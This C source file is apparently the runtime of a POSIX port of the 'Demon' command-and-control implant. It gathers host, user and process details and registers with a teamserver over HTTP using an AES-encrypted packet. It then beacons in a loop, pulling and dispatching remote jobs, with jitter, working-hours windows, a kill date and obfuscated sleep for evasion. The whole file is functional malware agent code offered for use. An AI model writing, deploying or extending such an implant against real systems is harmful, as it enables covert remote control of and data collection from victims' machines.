/*
 * Runtime.c — Agent bootstrap, check-in loop, and session info collection.
 *
 * Flow:
 *   1. CollectSessionInfo()    — gathers hostname, username, OS, process info
 *   2. BuildRegisterPacket()   — serialises session info into the binary
 *                               registration packet (same format as Demon/Windows)
 *   3. RuntimeLoop()           — main beacon loop: send check-in / receive jobs /
 *                               dispatch commands / sleep
 */

#include "DemonPosix.h"
#include <sys/utsname.h>
#include <sys/resource.h>
#include <pwd.h>
#include <time.h>
#include <pthread.h>

#ifdef __APPLE__
#  include <mach-o/dyld.h>
#  include <libproc.h>
#endif

/* ── Global instance ─────────────────────────────────────────────────── */
INSTANCE *DemonInstance = NULL;

/* ── Utility: random 32-bit agent ID ────────────────────────────────── */
uint32_t GenerateAgentID(void)
{
    uint32_t id = 0;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        read(fd, &id, sizeof(id));
        close(fd);
    } else {
        /* Fallback: mix PID + time */
        id = (uint32_t)((uintptr_t)getpid() ^ (uintptr_t)time(NULL));
    }
    return id;
}

/* ── Kill date check ─────────────────────────────────────────────────── */
bool IsKillDatePassed(void)
{
    if (DemonInstance->Session.KillDate == 0) return false;
    return (int64_t)time(NULL) >= DemonInstance->Session.KillDate;
}

/* ── Working hours check ─────────────────────────────────────────────── */
bool IsWorkingHours(void)
{
    int32_t wh = DemonInstance->Session.WorkingHours;
    if (wh == 0) return true; /* no restriction */

    uint16_t start = (uint16_t)(wh & 0xFFFF);
    uint16_t end   = (uint16_t)((wh >> 16) & 0xFFFF);

    time_t    now   = time(NULL);
    struct tm local = {0};
    localtime_r(&now, &local);
    uint16_t minutes = (uint16_t)(local.tm_hour * 60 + local.tm_min);

    if (start <= end) return (minutes >= start && minutes < end);
    else              return (minutes >= start || minutes < end);
}

/* ── Sleep with optional jitter ─────────────────────────────────────── */
void DoSleep(uint32_t seconds, uint32_t jitter_pct)
{
    if (seconds == 0) return;
    uint32_t actual = seconds;
    if (jitter_pct > 0 && jitter_pct <= 100) {
        uint32_t max_delta = seconds * jitter_pct / 100;
        uint32_t rnd = 0;
        int fd = open("/dev/urandom", O_RDONLY);
        if (fd >= 0) { read(fd, &rnd, sizeof(rnd)); close(fd); }
        uint32_t delta = rnd % (max_delta + 1);
        /* randomly add or subtract */
        actual = (rnd & 1) ? seconds + delta : (seconds > delta ? seconds - delta : 0);
    }
    struct timespec ts = { .tv_sec = actual, .tv_nsec = 0 };
    nanosleep(&ts, NULL);
}

/* ObfuscatedSleep is defined in Evasion.c — forward declaration only */

/* ── Collect session information ─────────────────────────────────────── */
void CollectSessionInfo(void)
{
    SESSION *s = &DemonInstance->Session;

    /* Hostname */
    gethostname(s->Hostname, sizeof(s->Hostname));

    /* Username */
    struct passwd *pw = getpwuid(getuid());
    if (pw) strncpy(s->Username, pw->pw_name, sizeof(s->Username)-1);
    else    snprintf(s->Username, sizeof(s->Username), "uid%d", getuid());

    /* Domain — not meaningful on POSIX; use hostname or empty */
    strncpy(s->Domain, s->Hostname, sizeof(s->Domain)-1);

    /* Internal IP — pick first non-loopback IPv4 */
    s->InternalIP[0] = '\0';
    struct ifaddrs *ifap = NULL, *ifa;
    if (getifaddrs(&ifap) == 0) {
        for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
            if (!ifa->ifa_addr) continue;
            if (ifa->ifa_addr->sa_family != AF_INET) continue;
            const char *name = ifa->ifa_name;
            if (strcmp(name, "lo") == 0 || strcmp(name, "lo0") == 0) continue;
            struct sockaddr_in *sin = (struct sockaddr_in *)ifa->ifa_addr;
            inet_ntop(AF_INET, &sin->sin_addr, s->InternalIP, sizeof(s->InternalIP));
            break;
        }
        freeifaddrs(ifap);
    }
    if (s->InternalIP[0] == '\0') strncpy(s->InternalIP, "127.0.0.1", sizeof(s->InternalIP)-1);

    /* Process info */
    s->ProcessPID  = (uint32_t)getpid();
    s->ProcessPPID = (uint32_t)getppid();

#ifdef __APPLE__
    /* macOS: get process name via libproc */
    char proc_path[PROC_PIDPATHINFO_MAXSIZE] = "";
    if (proc_pidpath((int)s->ProcessPID, proc_path, sizeof(proc_path)) > 0) {
        strncpy(s->ProcessPath, proc_path, sizeof(s->ProcessPath)-1);
        char *slash = strrchr(proc_path, '/');
        strncpy(s->ProcessName, slash ? slash + 1 : proc_path, sizeof(s->ProcessName)-1);
    }
    s->OsType = DEMON_OS_MACOS;
#else
    /* Linux: read /proc/self/exe */
    ssize_t n = readlink("/proc/self/exe", s->ProcessPath, sizeof(s->ProcessPath)-1);
    if (n > 0) {
        s->ProcessPath[n] = '\0';
        char *slash = strrchr(s->ProcessPath, '/');
        strncpy(s->ProcessName, slash ? slash + 1 : s->ProcessPath, sizeof(s->ProcessName)-1);
    }
    s->OsType = DEMON_OS_LINUX;
#endif

    /* Elevated: effective uid == 0 */
    s->Elevated = (geteuid() == 0);

    /* Base address of the running executable */
#ifdef __APPLE__
    s->BaseAddress = (uintptr_t)_dyld_get_image_header(0);
#else
    /* Linux: parse /proc/self/maps for the first r-xp segment */
    FILE *maps = fopen("/proc/self/maps", "r");
    if (maps) {
        unsigned long start;
        if (fscanf(maps, "%lx-", &start) == 1)
            s->BaseAddress = (uintptr_t)start;
        fclose(maps);
    }
#endif

    /* Architecture */
#if defined(__aarch64__)
    s->ProcessArch = PROCESS_ARCH_ARM64;
    s->OsArch      = 12; /* ARM64 (matches Windows Demon arch enum) */
#elif defined(__x86_64__)
    s->ProcessArch = PROCESS_ARCH_X64;
    s->OsArch      = 9;  /* x64/AMD64 */
#else
    s->ProcessArch = PROCESS_ARCH_UNKNOWN;
    s->OsArch      = 0;
#endif

    /* OS version via uname */
    struct utsname uts;
    if (uname(&uts) == 0) {
        /* Parse major.minor.patch from uts.release e.g. "5.15.0-91-generic" or "23.4.0" */
        sscanf(uts.release, "%u.%u.%u", &s->OsMajor, &s->OsMinor, &s->OsPatch);
    }

    DEMON_LOG("Session: host=%s user=%s pid=%u elevated=%d os=%s %u.%u.%u",
              s->Hostname, s->Username, s->ProcessPID, s->Elevated,
              s->OsType == DEMON_OS_MACOS ? "macOS" : "Linux",
              s->OsMajor, s->OsMinor, s->OsPatch);
}

/* ── Build registration packet ───────────────────────────────────────── */
/*
 * The packet layout mirrors ParseDemonRegisterRequest() in the Go teamserver
 * so no changes are needed server-side for POSIX agents.
 *
 * AES Encrypted {
 *   [4]  AgentID
 *   [s]  Hostname   (len+bytes NUL)
 *   [s]  Username
 *   [s]  Domain
 *   [s]  InternalIP
 *   [s]  ProcessName  (UTF-16 on Windows; we send UTF-8 — teamserver handles both)
 *   [4]  ProcessPID
 *   [4]  ProcessTID  (= PID for POSIX, no TID distinction at this level)
 *   [4]  ProcessPPID
 *   [4]  ProcessArch
 *   [4]  Elevated
 *   [8]  BaseAddress
 *   [4]  OsMajor
 *   [4]  OsMinor
 *   [4]  OsType      (NEW: 0x02=Linux, 0x03=macOS — stored in 5th OsVersion slot)
 *   [4]  OsPatch
 *   [4]  OsBuild (= 0 for POSIX)
 *   [4]  OsArch
 *   [4]  SleepDelay
 *   [4]  SleepJitter
 *   [8]  KillDate
 *   [4]  WorkingHours
 * }
 *
 * Outer frame:
 *   [4]  SIZE
 *   [4]  MAGIC
 *   [4]  AgentID
 *   [4]  COMMAND_CHECKIN
 *   [4]  RequestID (0)
 *   [32] AES Key
 *   [16] AES IV
 *   [N]  encrypted body
 */
uint8_t *BuildRegisterPacket(size_t *out_len)
{
    SESSION    *s   = &DemonInstance->Session;
    ENCRYPTION *enc = &DemonInstance->Encryption;

    /* ── Build the plaintext body ── */
    PKG_BUFFER *body = PkgCreate(0, 0); /* cmd/req placeholders; we overwrite frame */
    body->Length = 0; /* reset, we fill raw */

    /* We build the body manually as a flat byte stream */
    PKG_BUFFER *tmp = (PKG_BUFFER *)calloc(1, sizeof(PKG_BUFFER));
    tmp->Capacity = 2048;
    tmp->Buffer   = (uint8_t *)malloc(tmp->Capacity);
    tmp->Length   = 0;

#define PUT32(v)  PkgAddInt32(tmp, (int32_t)(v))
#define PUT64(v)  PkgAddInt64(tmp, (int64_t)(v))
#define PUTSTR(v) PkgAddString(tmp, (v))

    PUT32(s->AgentID);
    PUTSTR(s->Hostname);
    PUTSTR(s->Username);
    PUTSTR(s->Domain);
    PUTSTR(s->InternalIP);
    PUTSTR(s->ProcessName);   /* teamserver reads this as UTF-16 on Windows but
                                 handles UTF-8 strings from POSIX agents */
    PUT32(s->ProcessPID);
    PUT32(s->ProcessPID);     /* TID == PID on POSIX */
    PUT32(s->ProcessPPID);
    PUT32(s->ProcessArch);
    PUT32(s->Elevated ? 1 : 0);
    PUT64(s->BaseAddress);
    /* OsVersion[5]: [major][minor][isWorkstation=1][servicepack=0][osType/build] */
    PUT32(s->OsMajor);
    PUT32(s->OsMinor);
    PUT32(1);                 /* workstation flag */
    PUT32(0);                 /* service pack */
    PUT32(s->OsType);         /* stores DEMON_OS_LINUX or DEMON_OS_MACOS */
    PUT32(s->OsArch);
    PUT32(s->SleepDelay);
    PUT32(s->SleepJitter);
    PUT64(s->KillDate);
    PUT32(s->WorkingHours);

#undef PUT32
#undef PUT64
#undef PUTSTR

    /* ── Encrypt the body ── */
    size_t   enc_sz  = tmp->Length + AES_BLOCK_SIZE;
    uint8_t *enc_buf = (uint8_t *)malloc(enc_sz);
    size_t   actual_enc = 0;
    AES256_Encrypt(tmp->Buffer, tmp->Length, enc_buf, &actual_enc,
                   enc->AesKey, enc->AesIv);
    PkgFree(tmp);
    free(body);

    /*
     * Full registration frame:
     *   [4]  SIZE        (everything after this field)
     *   [4]  MAGIC
     *   [4]  AgentID
     *   [4]  COMMAND_CHECKIN
     *   [4]  RequestID = 0
     *   [32] AES Key
     *   [16] AES IV
     *   [N]  encrypted body
     */
    size_t hdr_size  = 4 + 4 + 4 + 4 + 32 + 16; /* MAGIC+ID+CMD+REQ+KEY+IV */
    size_t body_size = actual_enc;
    size_t total     = 4 + hdr_size + body_size;  /* SIZE field + rest */

    uint8_t *frame = (uint8_t *)malloc(total);
    if (!frame) { free(enc_buf); *out_len = 0; return NULL; }

    size_t off = 0;
    /* SIZE = total - 4 */
    frame[off++] = (uint8_t)((hdr_size + body_size));
    frame[off++] = (uint8_t)((hdr_size + body_size) >> 8);
    frame[off++] = (uint8_t)((hdr_size + body_size) >> 16);
    frame[off++] = (uint8_t)((hdr_size + body_size) >> 24);
    /* MAGIC */
    frame[off++] = (uint8_t)(DEMON_MAGIC_VALUE);
    frame[off++] = (uint8_t)(DEMON_MAGIC_VALUE >> 8);
    frame[off++] = (uint8_t)(DEMON_MAGIC_VALUE >> 16);
    frame[off++] = (uint8_t)(DEMON_MAGIC_VALUE >> 24);
    /* AgentID */
    frame[off++] = (uint8_t)(s->AgentID);
    frame[off++] = (uint8_t)(s->AgentID >> 8);
    frame[off++] = (uint8_t)(s->AgentID >> 16);
    frame[off++] = (uint8_t)(s->AgentID >> 24);
    /* COMMAND_CHECKIN */
    frame[off++] = (uint8_t)(COMMAND_CHECKIN);
    frame[off++] = (uint8_t)(COMMAND_CHECKIN >> 8);
    frame[off++] = (uint8_t)(COMMAND_CHECKIN >> 16);
    frame[off++] = (uint8_t)(COMMAND_CHECKIN >> 24);
    /* RequestID = 0 */
    memset(frame + off, 0, 4); off += 4;
    /* AES Key */
    memcpy(frame + off, enc->AesKey, AES_KEY_SIZE); off += AES_KEY_SIZE;
    /* AES IV */
    memcpy(frame + off, enc->AesIv, AES_IV_SIZE);  off += AES_IV_SIZE;
    /* Encrypted body */
    memcpy(frame + off, enc_buf, actual_enc);        off += actual_enc;

    free(enc_buf);
    *out_len = total;
    return frame;
}

/* ── Main beacon loop ────────────────────────────────────────────────── */
void RuntimeLoop(void)
{
    /* Generate fresh AES key/IV */
    ENCRYPTION *enc = &DemonInstance->Encryption;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        read(fd, enc->AesKey, AES_KEY_SIZE);
        read(fd, enc->AesIv,  AES_IV_SIZE);
        close(fd);
    }

    /* Collect session info */
    CollectSessionInfo();
    DemonInstance->Session.AgentID = GenerateAgentID();

    /* Init transport */
    if (TransportHttpInit() != 0) {
        DEMON_LOG("Failed to init transport");
        return;
    }

    /* ── Registration ── */
    bool registered = false;
    int  retry      = 0;
    while (!registered && retry < 10) {
        size_t   pkt_len = 0;
        uint8_t *pkt     = BuildRegisterPacket(&pkt_len);
        if (!pkt) { DoSleep(5, 0); retry++; continue; }

        uint8_t *resp     = NULL;
        size_t   resp_len = 0;
        int      rc       = TransportSendRecv(pkt, pkt_len, &resp, &resp_len);
        free(pkt);

        if (rc == 0 && resp_len > 0) {
            registered = true;
            DEMON_LOG("Registered with teamserver");
        } else {
            DEMON_LOG("Registration failed (attempt %d)", retry + 1);
            DoSleep(5, 0);
            retry++;
        }
        if (resp) free(resp);
    }

    if (!registered) {
        DEMON_LOG("Could not register after %d attempts, exiting", retry);
        TransportHttpCleanup();
        return;
    }

    /* ── Main loop ── */
    while (!DemonInstance->ShouldExit) {
        if (IsKillDatePassed()) {
            DEMON_LOG("Kill date passed, exiting");
            break;
        }
        if (!IsWorkingHours()) {
            DoSleep(60, 0);
            continue;
        }

        /* Send a check-in beacon (empty PKG so the server knows we are alive
         * and returns any queued jobs) */
        PKG_BUFFER *checkin = PkgCreate(COMMAND_CHECKIN, 0);
        size_t      msg_len = 0;
        uint8_t    *msg     = PkgBuildMessage(checkin,
                                              enc->AesKey, enc->AesIv,
                                              &msg_len);
        PkgFree(checkin);

        uint8_t *resp     = NULL;
        size_t   resp_len = 0;

        if (msg && TransportSendRecv(msg, msg_len, &resp, &resp_len) == 0
                && resp_len > 12) {
            /* Parse and dispatch all jobs returned */
            PARSER *p = ParserNew(resp, resp_len);
            if (p) {
                /* Skip outer frame header: SIZE(4) MAGIC(4) AGENTID(4) */
                ParserReadInt32(p); /* SIZE */
                ParserReadInt32(p); /* MAGIC */
                ParserReadInt32(p); /* AGENTID */

                /* Decrypt payload if present */
                if (p->Length >= 4) {
                    ParserDecrypt(p, enc->AesKey, enc->AesIv);
                }

                /* Dispatch each command in the payload */
                while (p->Length >= 12) {
                    uint32_t cmdID = (uint32_t)ParserReadInt32(p);
                    uint32_t reqID = (uint32_t)ParserReadInt32(p);
                    uint32_t dsize = (uint32_t)ParserReadInt32(p);

                    if (dsize > p->Length) break;

                    PARSER *cmd_parser = ParserNew(p->Buffer, dsize);
                    p->Buffer += dsize;
                    p->Length -= dsize;

                    if (cmd_parser) {
                        CommandDispatcher(cmdID, reqID, cmd_parser);
                        ParserFree(cmd_parser);
                    }
                }
                ParserFree(p);
            }
        }

        if (msg)  free(msg);
        if (resp) free(resp);

        if (DemonInstance->ObfSleep) {
            ObfuscatedSleep(DemonInstance->Session.SleepDelay,
                            DemonInstance->Session.SleepJitter);
        } else {
            DoSleep(DemonInstance->Session.SleepDelay,
                    DemonInstance->Session.SleepJitter);
        }
    }

    TransportHttpCleanup();
}

/* ── Entry point for the agent runtime ──────────────────────────────── */
void RuntimeInit(void)
{
    DemonInstance = (INSTANCE *)calloc(1, sizeof(INSTANCE));
    if (!DemonInstance) return;

    /* Defaults — overridden by config embedded at compile time */
    DemonInstance->Session.SleepDelay  = 5;
    DemonInstance->Session.SleepJitter = 10;
    DemonInstance->ObfSleep            = false;

    /* Transport defaults — will be overridden by compile-time config macros */
#ifdef CONFIG_HOST
    DemonInstance->Transport.Http.Host = CONFIG_HOST;
#else
    DemonInstance->Transport.Http.Host = "127.0.0.1";
#endif

#ifdef CONFIG_PORT
    DemonInstance->Transport.Http.Port = CONFIG_PORT;
#else
    DemonInstance->Transport.Http.Port = 80;
#endif

#ifdef CONFIG_URI
    DemonInstance->Transport.Http.Uri = CONFIG_URI;
#else
    DemonInstance->Transport.Http.Uri = "/";
#endif

#ifdef CONFIG_SSL
    DemonInstance->Transport.Http.Ssl = (bool)CONFIG_SSL;
#else
    DemonInstance->Transport.Http.Ssl = false;
#endif

    pthread_mutex_init(&DemonInstance->JobsMtx, NULL);

    RuntimeLoop();

    pthread_mutex_destroy(&DemonInstance->JobsMtx);
    free(DemonInstance);
    DemonInstance = NULL;
}
